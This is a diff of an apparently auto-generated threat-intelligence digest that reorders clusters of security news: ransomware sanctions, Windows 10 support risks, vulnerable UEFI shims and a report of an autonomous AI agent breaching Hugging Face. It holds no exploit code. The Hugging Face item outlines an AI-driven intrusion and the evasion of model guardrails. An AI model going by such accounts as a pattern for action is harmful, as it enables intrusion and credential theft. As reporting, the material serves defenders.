-
-- **Risky Business News** (practitioner_analysis)
-  - Title: Risky Bulletin: Hacker wipes Romania's entire land registry database
-  - Published: 2026-07-20T05:22:45+00:00
-  - Link: https://risky.biz/RBNEWS589/
-  - Summary: A hacker wipes Romania’s entire land registry database, Magnet Forensics sues a former employee for leaking an iPhone exploit, an autonomous AI agent hacked Hugging Face, and an unauthenticated remote code execution bug was finally found in WordPress.
 
 ### Cluster a632c3dcbf — score 12
 
@@ -1974,6 +1930,47 @@ FILTER BY YEAR 2026 2025 2024 2023 2022 2021 2020 2019 2018 2017 2016 20th July 
   - Link: https://research.checkpoint.com/2026/20th-july-threat-intelligence-report/
   - Summary: For the latest discoveries in cyber research for the week of 20th July, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Ernst & Young, a global accounting and professional services company, has disclosed a data breach involving a compromised third-party IT support platform. The exposed support tickets may have contained client documents, tax information, […] The post 20th July – Threat Intelligence Report appeared first on Check Point Research .
 
+### Cluster 80fad3eb43 — score 11
+
+- Title: “Stern,” Likely Most Prolific Ransomware Operator Ever, Sanctioned by EU as Action Targets Billions in Ransomware Damage
+- Source: Chainalysis (ransomware_ecrime_financial_crime)
+- Published: 2026-07-14T15:24:02+00:00
+- Link: https://www.chainalysis.com/blog/cyber-sanctions-trickbot-administrator-july-2026/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: apt_espionage, ransomware_extortion
+- content_type: news_report
+- confidence_tier: tier_2_operator
+
+#### Primary article taxonomy
+- threat_categories: ransomware_extortion, apt_espionage
+- content_type: news_report
+- confidence_tier: tier_2_operator
+
+#### Summary
+
+```
+Summary The United States, United Kingdom, and European Union announced sanctions targeting nation-state hackers, cybercriminals, and their enablers in one… The post “Stern,” Likely Most Prolific Ransomware Operator Ever, Sanctioned by EU as Action Targets Billions in Ransomware Damage appeared first on Chainalysis .
+```
+
+#### Full body
+
+```
+Crime Inside a Sandwich Attack: Lessons From the $7.5 Million Heist Against JaredfromSubway.eth June 26, 2026
+```
+
+#### Corroborating sources (1)
+
+- **Chainalysis** (ransomware_ecrime_financial_crime)
+  - Title: “Stern,” Likely Most Prolific Ransomware Operator Ever, Sanctioned by EU as Action Targets Billions in Ransomware Damage
+  - Published: 2026-07-14T15:24:02+00:00
+  - Link: https://www.chainalysis.com/blog/cyber-sanctions-trickbot-administrator-july-2026/
+  - Summary: Summary The United States, United Kingdom, and European Union announced sanctions targeting nation-state hackers, cybercriminals, and their enablers in one… The post “Stern,” Likely Most Prolific Ransomware Operator Ever, Sanctioned by EU as Action Targets Billions in Ransomware Damage appeared first on Chainalysis .
+
 ### Cluster e5476c476d — score 11
 
 - Title: What’s in the SOSS? Podcast #65 – S3E17 Signing the Future: Securing AI and ML Artifacts with Mihai Maruseac
@@ -2017,177 +2014,46 @@ Summary In this episode of What’s in the SOSS?, host Yesenia Yser sits down wi
   - Link: https://openssf.org/podcast/2026/07/14/whats-in-the-soss-podcast-65-s3e17-signing-the-future-securing-ai-and-ml-artifacts-with-mihai-maruseac/
   - Summary: In this episode of What’s in the SOSS?, host Yesenia Yser sits down with Mihai Maruseac (OpenAI) to discuss the OpenSSF Model Signing (OMS) specification, securing the AI/ML supply chain, and establishing a cryptographic chain of custody for models and datasets.
 
-### Cluster 80fad3eb43 — score 11
+### Cluster 8013169017 — score 11
 
-- Title: “Stern,” Likely Most Prolific Ransomware Operator Ever, Sanctioned by EU as Action Targets Billions in Ransomware Damage
-- Source: Chainalysis (ransomware_ecrime_financial_crime)
-- Published: 2026-07-14T15:24:02+00:00
-- Link: https://www.chainalysis.com/blog/cyber-sanctions-trickbot-administrator-july-2026/
+- Title: Risky Bulletin: Hacker wipes Romania's entire land registry database
+- Source: Risky Business News (practitioner_analysis)
+- Published: 2026-07-20T05:22:45+00:00
+- Link: https://risky.biz/RBNEWS589/
 - Fetch status: ok
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
-- threat_categories: apt_espionage, ransomware_extortion
+- urgency_signals: preauth_unauth
 - content_type: news_report
-- confidence_tier: tier_2_operator
+- confidence_tier: tier_3_analysis
 
 #### Primary article taxonomy
-- threat_categories: ransomware_extortion, apt_espionage
+- urgency_signals: preauth_unauth
 - content_type: news_report
-- confidence_tier: tier_2_operator
+- confidence_tier: tier_3_analysis
 
 #### Summary
 
 ```
-Summary The United States, United Kingdom, and European Union announced sanctions targeting nation-state hackers, cybercriminals, and their enablers in one… The post “Stern,” Likely Most Prolific Ransomware Operator Ever, Sanctioned by EU as Action Targets Billions in Ransomware Damage appeared first on Chainalysis .
+A hacker wipes Romania’s entire land registry database, Magnet Forensics sues a former employee for leaking an iPhone exploit, an autonomous AI agent hacked Hugging Face, and an unauthenticated remote code execution bug was finally found in WordPress.
 ```
 
 #### Full body
 
 ```
-Crime Inside a Sandwich Attack: Lessons From the $7.5 Million Heist Against JaredfromSubway.eth June 26, 2026
+Risky Bulletin Podcast July 20, 2026 Risky Bulletin: Hacker wipes Romania's entire land registry database Presented by Catalin Cimpanu News Editor Claire Aird Newsreader A hacker wipes Romaniaâs entire land registry database, Magnet Forensics sues a former employee for leaking an iPhone exploit, an autonomous AI agent hacked Hugging Face, and an unauthenticated remote code execution bug was finally found in WordPress. Your browser does not support the audio element. Risky Bulletin: Hacker wipes Romania's entire land registry database â¶ 0:00 / 9:03 Subscribe Brought to you by Thinkst Know. When it Matters! Show notes Risky Bulletin: Hacker wipes Romania's entire land registry database
 ```
 
 #### Corroborating sources (1)
 
-- **Chainalysis** (ransomware_ecrime_financial_crime)
-  - Title: “Stern,” Likely Most Prolific Ransomware Operator Ever, Sanctioned by EU as Action Targets Billions in Ransomware Damage
-  - Published: 2026-07-14T15:24:02+00:00
-  - Link: https://www.chainalysis.com/blog/cyber-sanctions-trickbot-administrator-july-2026/
-  - Summary: Summary The United States, United Kingdom, and European Union announced sanctions targeting nation-state hackers, cybercriminals, and their enablers in one… The post “Stern,” Likely Most Prolific Ransomware Operator Ever, Sanctioned by EU as Action Targets Billions in Ransomware Damage appeared first on Chainalysis .
-
-### Cluster 05695d371f — score 11
-
-- Title: The Windows 10 hangover is becoming a security problem
-- Source: Help Net Security (cyber_news_breach_reporting)
-- Published: 2026-07-20T08:37:50+00:00
-- Link: https://www.helpnetsecurity.com/2026/07/20/windows-10-support-risks-report/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: Microsoft Windows
-
-#### Cluster taxonomy (union across members)
-- threat_categories: active_exploitation
-- affected_industries: healthcare, manufacturing_industrial, retail_ecommerce
-- affected_products: Microsoft Windows
-- urgency_signals: actively_exploited, no_patch_yet
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: active_exploitation
-- affected_industries: healthcare, manufacturing_industrial, retail_ecommerce
-- affected_products: Microsoft Windows
-- urgency_signals: actively_exploited, no_patch_yet
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-Windows 11 now runs on 78.8% of Windows devices after Microsoft ended support for Windows 10 on 14 October 2025, according to Lansweeper. Windows 10 still accounts for 16.9% of devices and no longer receives security updates, leaving newly discovered vulnerabilities unpatched. “There’s a temporary bridge that we need to consider when looking at these numbers. Microsoft’s consumer Extended Security Updates program keeps eligible Windows 10 devices patched for one extra year, until October 12, … More → The post The Windows 10 hangover is becoming a security problem appeared first on Help Net Security .
-```
-
-#### Full body
-
-```
-Anamarija Pogorelec , Senior Staff Writer, Help Net Security July 20, 2026 Share The Windows 10 hangover is becoming a security problem Windows 11 now runs on 78.8% of Windows devices after Microsoft ended support for Windows 10 on 14 October 2025, according to Lansweeper. Windows 10 still accounts for 16.9% of devices and no longer receives security updates , leaving newly discovered vulnerabilities unpatched. “There’s a temporary bridge that we need to consider when looking at these numbers. Microsoft’s consumer Extended Security Updates program keeps eligible Windows 10 devices patched for one extra year, until October 12, 2027. But this is a paid extension, a temporary solution, not a destination, and it excludes most enterprise, LTSC, and domain-joined configurations,” Laura Libeer , Technical Content Copywriter at Lansweeper, said . In the European Economic Area ( EEA ), eligible Windows 10 users can receive free ESU until 14 October 2026 without enabling Windows Backup or syncing settings, apps, or credentials to the cloud. Outside the EEA, consumers must pay for ESU, redeem Microsoft Rewards points, or enable Windows Backup to receive an additional year of security updates. Windows 10 adoption remains high in some sectors Many of the remaining devices either cannot or will not migrate to Windows 11. About 21.4% of Windows devices at SMBs still run Windows 10, compared with 16.6% at large organizations. Budget constraints continue to slow migration at smaller businesses, leaving some organizations on the unsupported operating system. Share of all Windows 10 devices on hardware that cannot run Windows 11, by industry. (Source: Lansweeper) Industries that rely on long-lived, certified, or embedded hardware have been the slowest to move away from Windows 10. Healthcare and pharmaceuticals have the highest share of Windows 10 devices, followed by consumer and retail, then manufacturing. Many of these systems are tied to specialized equipment, kiosks, and industrial devices that cannot be upgraded easily because of hardware limitations and vendor certification requirements. Security and compliance risks Windows 10 devices carry nearly three times as many active CVEs as Windows 11 systems, averaging 1,903 vulnerabilities per device compared with 652. Of those vulnerabilities, 66.6% are rated high or critical, while 2.4% are known to be actively exploited. Some Windows 10 Long-Term Servicing Channel (LTSC) editions remain supported under separate lifecycle policies. Regulatory frameworks require organizations to keep systems on supported software or document and mitigate the risks associated with unsupported systems. Cyber insurers are also scrutinizing unsupported operating systems more closely. Organizations risk higher premiums, coverage exclusions, or denied claims if unsupported devices contribute to a security incident. Support deadline nears About 2.8% of Windows 10 systems do not meet Windows 11’s hardware requirements, making hardware replacement the only upgrade path. These devices are concentrated in consumer and retail, transport and logistics, and manufacturing, where specialized systems such as point-of-sale terminals, rugged handhelds, and embedded controllers are designed for long service lives and are often tied to specific hardware and software requirements. Windows 10 is not the only unsupported operating system still in use. Including Windows 7, Windows 8.1, and Windows XP, 18.7% of Windows devices run an operating system that has reached end of support. Another 22.2% run versions that will reach end of support within the next six months, bringing the total share of unsupported or soon-to-be unsupported systems to 40.9%. “The consumer Extended Security Updates that are holding much of the remaining Windows 10 base together expire on 12 October 2027. When it lapses, the devices that it is holding up do not migrate on their own. They will roll straight into the unsupported count. This means two in five Window
-```
-
-#### Corroborating sources (1)
-
-- **Help Net Security** (cyber_news_breach_reporting)
-  - Title: The Windows 10 hangover is becoming a security problem
-  - Published: 2026-07-20T08:37:50+00:00
-  - Link: https://www.helpnetsecurity.com/2026/07/20/windows-10-support-risks-report/
-  - Summary: Windows 11 now runs on 78.8% of Windows devices after Microsoft ended support for Windows 10 on 14 October 2025, according to Lansweeper. Windows 10 still accounts for 16.9% of devices and no longer receives security updates, leaving newly discovered vulnerabilities unpatched. “There’s a temporary bridge that we need to consider when looking at these numbers. Microsoft’s consumer Extended Security Updates program keeps eligible Windows 10 devices patched for one extra year, until October 12, … More → The post The Windows 10 hangover is becoming a security problem appeared first on Help Net Security .
-
-### Cluster 2de7ac9412 — score 11
-
-- Title: World's Largest AI Model Repository Hugging Face Breached by Autonomous AI Agent
-- Source: The Hacker News (cyber_news_breach_reporting)
-- Published: 2026-07-20T05:27:26+00:00
-- Link: https://thehackernews.com/2026/07/worlds-largest-ai-model-repository.html
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: credential_theft, data_breach, phishing_social_eng, supply_chain
-- affected_products: Microsoft 365
-- content_type: threat_research
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: supply_chain, phishing_social_eng, credential_theft, data_breach
-- affected_products: Microsoft 365
-- content_type: threat_research
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-In an ironic twist, open-source artificial intelligence (AI) platform Hugging Face revealed that it was the victim of a hack perpetrated by an autonomous AI agent system. The company said it detected and responded to the incident targeting its production infrastructure earlier last week. "We identified unauthorized access to a limited set of internal datasets and to several credentials used by
-```
-
-#### Full body
-
-```
-World's Largest AI Model Repository Hugging Face Breached by Autonomous AI Agent  Ravie Lakshmanan  Jul 20, 2026 AI Security / Vulnerability In an ironic twist, open-source artificial intelligence (AI) platform Hugging Face revealed that it was the victim of a hack perpetrated by an autonomous AI agent system. The company said it detected and responded to the incident targeting its production infrastructure earlier last week. "We identified unauthorized access to a limited set of internal datasets and to several credentials used by our services," the company said in a statement. While an investigation into the intrusion remains ongoing, Hugging Face said it has found no evidence that the AI agent tampered with public, user-facing models, datasets, or Spaces, and its own software supply chain. The starting point of the attack was the data processing pipeline itself, with a malicious dataset abusing two code execution paths, viz., in its remote code dataset loader and a template injection in a dataset configuration, to run code on a processing worker. With that access, the threat actor is said to have escalated to node-level access, collected cloud and cluster credentials, and moved laterally into several internal clusters over a weekend. The exact large language model (LLM) used to pull off the attack is unclear, but the campaign was executed by an autonomous agent framework performing "many thousands of individual actions across a swarm of short-lived sandboxes, with self-migrating command-and-control staged on public services." Hugging Face said it has since addressed the root cause of the issue, precisely the code execution pathways used for initial access. It also carried out the following remediation steps - Removed the attacker's foothold across the affected clusters and rebuilt the compromised nodes Revoked and rotated the affected credentials and tokens, and a broader rotation of secrets was undertaken as a precautionary measure. Deployed additional guardrails and stricter admission controls on its clusters Improved detection and alerting to ensure responders are notified within minutes, 24x7 As a further safeguard, Hugging Face is urging customers to rotate any access tokens and review recent activity on their accounts. The company also said it turned to Z.ai's GLM 5.2 , a Chinese open-weight model, to conduct the forensic analysis after Western frontier models refused requests containing real attack commands, exploit payloads, and command-and-control (C2) artifacts because their safety guardrails were triggered and owing to their inability to differentiate between an attacker and a legitimate incident response effort. "This experience points to a gap worth planning for," the New York-headquartered company said. "We do not know which model powered the attacker's agents, whether a jailbroken hosted model or an unrestricted open-weight one; either way, the attacker was bound by no usage policy, while our own forensic work was blocked by the guardrails of the hosted models we first tried." "The practical lesson for defenders: have a capable model you can run on your own infrastructure vetted and ready before an incident, both to avoid guardrail lockout and to keep attacker data and credentials from leaving your environment." Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  AI Security , Cloud security , Code Execution , Credential Theft , Cyber Attack , data breach , Incident response , Infrastructure Security , Open Source , Vulnerability ⚡ Top Stories This Week URGENT - Progress Tells ShareFile Customers to Shut Down Storage Zone Controllers Over Security Threat Misconfigured Server Reveals Three Evilginx Phishing Operations Targeting Microsoft 365 Meta Files Patent for AI That Can Listen All Day and Track How You're Feeling New MemGhost Attack Plants Persistent False Memories in AI Agents Throu
-```
-
-#### Corroborating sources (1)
-
-- **The Hacker News** (cyber_news_breach_reporting)
-  - Title: World's Largest AI Model Repository Hugging Face Breached by Autonomous AI Agent
-  - Published: 2026-07-20T05:27:26+00:00
-  - Link: https://thehackernews.com/2026/07/worlds-largest-ai-model-repository.html
-  - Summary: In an ironic twist, open-source artificial intelligence (AI) platform Hugging Face revealed that it was the victim of a hack perpetrated by an autonomous AI agent system. The company said it detected and responded to the incident targeting its production infrastructure earlier last week. "We identified unauthorized access to a limited set of internal datasets and to several credentials used by
-
-### Cluster 00e5bf80fc — score 10
-
-- Title: Turning threat intelligence into decisive action with Defender Experts
-- Source: Microsoft Security Blog (threat_research_primary)
-- Published: 2026-07-15T16:00:35+00:00
-- Link: https://www.microsoft.com/en-us/security/blog/2026/07/15/turning-threat-intelligence-into-decisive-action-with-defender-experts/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- affected_products: Microsoft Defender
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Primary article taxonomy
-- affected_products: Microsoft Defender
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Summary
-
-```
-Security teams have never had more visibility, yet rarely have they felt more uncertain. Signal pours in from endpoints, identities, cloud workloads, and a sprawling mix of third-party tools. The post Turning threat intelligence into decisive action with Defender Experts appeared first on Microsoft Security Blog .
-```
-
-#### Full body
-
-```
-Share Link copied to clipboard! Content types Research Products and services Microsoft Defender Microsoft Defender Experts MDR Microsoft Defender Experts Threat Intelligence Topics Actionable threat insights Defending against advanced tactics Security teams have never had more visibility, yet rarely have they felt more uncertain. Signal pours in from endpoints, identities, cloud workloads, and a sprawling mix of third-party tools. Dashboards are full, alerts keep coming, but the hardest question of the day remains unanswered: of everything happening right now, what actually matters to us , and what do we do about i t? That space between knowing a threat exists and acting on it is the intelligence-to-action gap, and it’s where most breaches are won or lost. It doesn’t close with another feed or another dashboard. It closes with expertise: seasoned defenders who know your environment, interpret what global signal means for your risk, and stay with you from the first indicator to the final response. Today we’re announcing a new service, Microsoft Defender Experts Threat Intelligence , and we are expanding Microsoft Defender Experts MDR to include new third-party and multi-cloud coverage. Together, these human-led offerings are designed to close the intelligence-to-action gap at the two moments that decide the outcome: before a campaign reaches you, and as it moves through your environment. Upstream: See the campaign before it reaches you The earlier you see a campaign forming, the more options you have, and the cheaper every decision becomes. Yet most threat intelligence still arrives as raw feeds or static reports: high in volume, low in context, and disconnected from what’s exposed in your estate. Teams end up with more to read and no more clarity on what to do about it. Microsoft Defender Experts Threat Intelligence is a new, expert-delivered service that closes that distance. Built on Microsoft’s visibility across endpoints, identity, cloud, and evolving attacker activity, it gives your team periodic, curated insight into the threats most likely to target you. Designated Microsoft experts interpret the global landscape through the lens of your industry, geography, and environment, then translate it into clear, prioritized guidance your team can act on. As campaigns evolve, experts continuously refine that guidance with newly observed infrastructure, tactics, and targeting patterns, helping your team adjust hunting, hardening, and response activities. The insight is tailored for both leadership and defenders, providing executive-ready context alongside technical recommendations so the entire organization can act from a shared understanding of the threat landscape. The goal is simple: help you reduce risk before an attack reaches your environment, not explain what happened after the fact. In practice, your team receives: Early-warning alerts on emerging campaigns relevant to you Campaign-evolution updates as activity unfolds Contextualized intelligence tied to your risk profile Recurring briefings from your designated expert, rotating across geopolitical, industry, and global perspectives, on a scheduled basis In your environment: Follow the threat everywhere it moves Modern attacks rarely stay in one place. They cross from email to endpoint to identity to cloud, and increasingly traverse disparate security tools. Even when organizations have visibility into those environments, connecting multi-vendor and multi-domain signals into a coherent attack story remains a challenge. That’s the gap we’re closing on the response side: Microsoft Defender Experts MDR (formerly Microsoft Defender Experts for XDR) is expanding with new third-party and multi-cloud coverage powered by Microsoft Sentinel. Defender Experts MDR provides a fully managed detection and response service that reduces noise, adds expert context, and drives action. With support for leading non-Microsoft sources across cloud, identity, email, network, and endpoint enviro
-```
-
-#### Corroborating sources (1)
-
-- **Microsoft Security Blog** (threat_research_primary)
-  - Title: Turning threat intelligence into decisive action with Defender Experts
-  - Published: 2026-07-15T16:00:35+00:00
-  - Link: https://www.microsoft.com/en-us/security/blog/2026/07/15/turning-threat-intelligence-into-decisive-action-with-defender-experts/
-  - Summary: Security teams have never had more visibility, yet rarely have they felt more uncertain. Signal pours in from endpoints, identities, cloud workloads, and a sprawling mix of third-party tools. The post Turning threat intelligence into decisive action with Defender Experts appeared first on Microsoft Security Blog .
+- **Risky Business News** (practitioner_analysis)
+  - Title: Risky Bulletin: Hacker wipes Romania's entire land registry database
+  - Published: 2026-07-20T05:22:45+00:00
+  - Link: https://risky.biz/RBNEWS589/
+  - Summary: A hacker wipes Romania’s entire land registry database, Magnet Forensics sues a former employee for leaking an iPhone exploit, an autonomous AI agent hacked Hugging Face, and an unauthenticated remote code execution bug was finally found in WordPress.
 
 ### Cluster 72fdd19b2c — score 10
 
@@ -2233,6 +2099,47 @@ Threat Research Center Insights Opinions Opinions AI, Automation and Attacks: Un
   - Published: 2026-07-16T23:00:59+00:00
   - Link: https://unit42.paloaltonetworks.com/ai-insights-incident-response-report/
   - Summary: Explore Unit 42's perspectives on AI's impact on cybersecurity, including key updates since the 2026 Incident Response Report. The post AI, Automation and Attacks: Unpacking the Unit 42 2026 Global Incident Response Report appeared first on Unit 42 .
+
+### Cluster 00e5bf80fc — score 10
+
+- Title: Turning threat intelligence into decisive action with Defender Experts
+- Source: Microsoft Security Blog (threat_research_primary)
+- Published: 2026-07-15T16:00:35+00:00
+- Link: https://www.microsoft.com/en-us/security/blog/2026/07/15/turning-threat-intelligence-into-decisive-action-with-defender-experts/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- affected_products: Microsoft Defender
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Primary article taxonomy
+- affected_products: Microsoft Defender
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Summary
+
+```
+Security teams have never had more visibility, yet rarely have they felt more uncertain. Signal pours in from endpoints, identities, cloud workloads, and a sprawling mix of third-party tools. The post Turning threat intelligence into decisive action with Defender Experts appeared first on Microsoft Security Blog .
+```
+
+#### Full body
+
+```
+Share Link copied to clipboard! Content types Research Products and services Microsoft Defender Microsoft Defender Experts MDR Microsoft Defender Experts Threat Intelligence Topics Actionable threat insights Defending against advanced tactics Security teams have never had more visibility, yet rarely have they felt more uncertain. Signal pours in from endpoints, identities, cloud workloads, and a sprawling mix of third-party tools. Dashboards are full, alerts keep coming, but the hardest question of the day remains unanswered: of everything happening right now, what actually matters to us , and what do we do about i t? That space between knowing a threat exists and acting on it is the intelligence-to-action gap, and it’s where most breaches are won or lost. It doesn’t close with another feed or another dashboard. It closes with expertise: seasoned defenders who know your environment, interpret what global signal means for your risk, and stay with you from the first indicator to the final response. Today we’re announcing a new service, Microsoft Defender Experts Threat Intelligence , and we are expanding Microsoft Defender Experts MDR to include new third-party and multi-cloud coverage. Together, these human-led offerings are designed to close the intelligence-to-action gap at the two moments that decide the outcome: before a campaign reaches you, and as it moves through your environment. Upstream: See the campaign before it reaches you The earlier you see a campaign forming, the more options you have, and the cheaper every decision becomes. Yet most threat intelligence still arrives as raw feeds or static reports: high in volume, low in context, and disconnected from what’s exposed in your estate. Teams end up with more to read and no more clarity on what to do about it. Microsoft Defender Experts Threat Intelligence is a new, expert-delivered service that closes that distance. Built on Microsoft’s visibility across endpoints, identity, cloud, and evolving attacker activity, it gives your team periodic, curated insight into the threats most likely to target you. Designated Microsoft experts interpret the global landscape through the lens of your industry, geography, and environment, then translate it into clear, prioritized guidance your team can act on. As campaigns evolve, experts continuously refine that guidance with newly observed infrastructure, tactics, and targeting patterns, helping your team adjust hunting, hardening, and response activities. The insight is tailored for both leadership and defenders, providing executive-ready context alongside technical recommendations so the entire organization can act from a shared understanding of the threat landscape. The goal is simple: help you reduce risk before an attack reaches your environment, not explain what happened after the fact. In practice, your team receives: Early-warning alerts on emerging campaigns relevant to you Campaign-evolution updates as activity unfolds Contextualized intelligence tied to your risk profile Recurring briefings from your designated expert, rotating across geopolitical, industry, and global perspectives, on a scheduled basis In your environment: Follow the threat everywhere it moves Modern attacks rarely stay in one place. They cross from email to endpoint to identity to cloud, and increasingly traverse disparate security tools. Even when organizations have visibility into those environments, connecting multi-vendor and multi-domain signals into a coherent attack story remains a challenge. That’s the gap we’re closing on the response side: Microsoft Defender Experts MDR (formerly Microsoft Defender Experts for XDR) is expanding with new third-party and multi-cloud coverage powered by Microsoft Sentinel. Defender Experts MDR provides a fully managed detection and response service that reduces noise, adds expert context, and drives action. With support for leading non-Microsoft sources across cloud, identity, email, network, and endpoint enviro
+```
+
+#### Corroborating sources (1)
+
+- **Microsoft Security Blog** (threat_research_primary)
+  - Title: Turning threat intelligence into decisive action with Defender Experts
+  - Published: 2026-07-15T16:00:35+00:00
+  - Link: https://www.microsoft.com/en-us/security/blog/2026/07/15/turning-threat-intelligence-into-decisive-action-with-defender-experts/
+  - Summary: Security teams have never had more visibility, yet rarely have they felt more uncertain. Signal pours in from endpoints, identities, cloud workloads, and a sprawling mix of third-party tools. The post Turning threat intelligence into decisive action with Defender Experts appeared first on Microsoft Security Blog .
 
 ### Cluster 1042e88cd6 — score 10
 
@@ -2538,6 +2445,53 @@ The serpent’s tongue: Luring the Python out of its den By Onur Mustafa Erdogan
   - Published: 2026-07-14T10:00:06+00:00
   - Link: https://blog.talosintelligence.com/the-serpents-tongue-luring-the-python-out-of-its-den/
   - Summary: This blog examines the full lifecycle of a Python package, from hosting on repositories such as PyPI or custom web servers, through source and wheel distribution formats, to the final installation into virtual or system-wide Python environments.
+
+### Cluster cf7aa5bc3e — score 10
+
+- Title: Forgotten UEFI shims undermining Secure Boot
+- Source: ESET WeLiveSecurity (threat_research_primary)
+- Published: 2026-07-14T08:53:00+00:00
+- Link: https://www.welivesecurity.com/en/eset-research/forgotten-uefi-shims-undermining-secure-boot/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: vulnerability_disclosure
+- affected_industries: critical_infrastructure
+- affected_products: Microsoft Windows
+- cve_ids: CVE-2026-10797, CVE-2026-8863
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Primary article taxonomy
+- threat_categories: vulnerability_disclosure
+- affected_industries: critical_infrastructure
+- affected_products: Microsoft Windows
+- cve_ids: CVE-2026-8863, CVE-2026-10797
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Summary
+
+```
+ESET researchers discovered 11 vulnerable UEFI shim bootloaders signed by Microsoft that allow attackers to bypass UEFI Secure Boot by exploiting decade-old vulnerabilities
+```
+
+#### Full body
+
+```
+ESET Research Forgotten UEFI shims undermining Secure Boot ESET researchers discovered 11 vulnerable UEFI shim bootloaders signed by Microsoft that allow attackers to bypass UEFI Secure Boot by exploiting decade-old vulnerabilities Martin Smolár 14 Jul 2026 • , 20 min. read ESET researchers identified 11 old and forgotten UEFI shim bootloaders at versions 0.9 and below that can be used to bypass UEFI Secure Boot on any UEFI-based machine that trusts Microsoft’s Microsoft Corporation UEFI CA 2011 third-party UEFI certificate authority (CA) certificate, regardless of the installed operating system (OS). Reported shims can be exploited to execute untrusted code during system boot, enabling attackers to deploy malicious UEFI bootkits (such as Bootkitty , HybridPetya , or BlackLotus ) even on systems with UEFI Secure Boot enabled. We reported our findings to CERT/CC in February 2026, and the vulnerable UEFI applications were revoked on Microsoft’s June 9 th , 2026 Patch Tuesday. While two CVE IDs were assigned to this case to cover the reported shims, CVE-2026-8863 and CVE-2026-10797 , exploitation of each reported shim is not just about a single bug or two that can be found in these old shims directly. In fact, the attack surface is extended by the shims’ trusted, second-stage bootloaders (mostly GRUB 2 ), which – like the shims themselves – may include outdated versions with known vulnerabilities. The discovered shims come from various tools or software packages, including PC-diagnostics software, Linux distributions, and other UEFI-based utilities. Importantly, exploitation is not limited to systems with the affected software or OS installed, as attackers can bring their own copy of the vulnerable shims to any UEFI system with the Microsoft third-party UEFI certificate enrolled. The full list of the software products relying on the reported shims along with their affected versions is available in CERT/CC’s Vulnerability Note . In response to ESET researchers’ report, UEFI shim bootloaders with the following PE Authenticode hashes were revoked in the dbx update that was part of Microsoft’s June 9 th Patch Tuesday : AE75F0D82BA3DF824FBFC69340CC3B4D66C598373B1AB54CDB6C8BFD83A6B961 7B2A3F5C96F95BD8086CE54B0825E300F9C8F11FE3401BB631B3215C8DE9EB10 EB86FA1386FE6E4533B8B938DCC1250616D2F1C14C15E2FCF80834A161018A0A FD23D6E57DE6F4E1F9D7118DA1C5F31A8AF6BE5E5D9E8170F9493447268D50C5 A0DE9333442C1BF9349A460141AE5E80F911955C6506040FA3D021BF6C1AE3E4 95B6D71FC0C0F8C5E1533A37AEF92CF6B0C961E2CC612A97117FA6759CE5FC06 236A9CB0D71951C36398A32EB660CE2CD4A52CCFA7CF751CC6A35D9DE549E19B 5E594C448760A3135B1A3A83E07A4F2E6FBE49414EF2C7CAB1CBA77F284FA63B 8A964D5F8373948D20A1D4296FB92E545DAD4617A0C810F3B934B53D98AE8963 410260B1B6F5AF5FBEEB9EA3220658435E876CB3247126EE907A437F312DB373 96275DFD6282A522B011177EE049296952AC794832091F937FBBF92869028629 Key points of this blogpost: ESET researchers discovered 11 old, Microsoft-signed, UEFI applications that allow bypassing UEFI Secure Boot on the majority of UEFI-based systems. An attacker exploiting one of these vulnerable applications can execute untrusted code during system boot, enabling deployment of malicious UEFI bootkits or other malware. Exploitation is not limited to systems with the affected software or OS installed, as attackers can bring their own copy of the vulnerable binaries to any UEFI system with the Microsoft third-party UEFI certificate enrolled. All UEFI systems with Microsoft third-party UEFI signing enabled are affected (Windows 11 Secured-core PCs should have this option disabled by default). The vulnerable binaries were revoked by Microsoft in the June 9 th , 2026 Patch Tuesday update. Following is the coordinated disclosure timeline. We’d like to thank CERT/CC for its help in coordinating the vulnerability disclosure process, and the affected vendors for smooth and transparent communication and cooperation during the vulnerability disclosure and remediation process. To protect your systems
+```
+
+#### Corroborating sources (1)
+
+- **ESET WeLiveSecurity** (threat_research_primary)
+  - Title: Forgotten UEFI shims undermining Secure Boot
+  - Published: 2026-07-14T08:53:00+00:00
+  - Link: https://www.welivesecurity.com/en/eset-research/forgotten-uefi-shims-undermining-secure-boot/
+  - Summary: ESET researchers discovered 11 vulnerable UEFI shim bootloaders signed by Microsoft that allow attackers to bypass UEFI Secure Boot by exploiting decade-old vulnerabilities
 
 ### Cluster c2f56a4fa7 — score 10
 
@@ -2877,53 +2831,6 @@ Tracking advanced persistent threat groups with real-time intelligence Key takea
   - Link: https://www.recordedfuture.com/blog/tracking-advanced-persistent-threats
   - Summary: Learn how real-time cyber intelligence powers advanced persistent threat detection, from exposing infrastructure to stopping attacks early.
 
-### Cluster cf7aa5bc3e — score 10
-
-- Title: Forgotten UEFI shims undermining Secure Boot
-- Source: ESET WeLiveSecurity (threat_research_primary)
-- Published: 2026-07-14T08:53:00+00:00
-- Link: https://www.welivesecurity.com/en/eset-research/forgotten-uefi-shims-undermining-secure-boot/
-- Fetch status: ok
-- Member count: 1
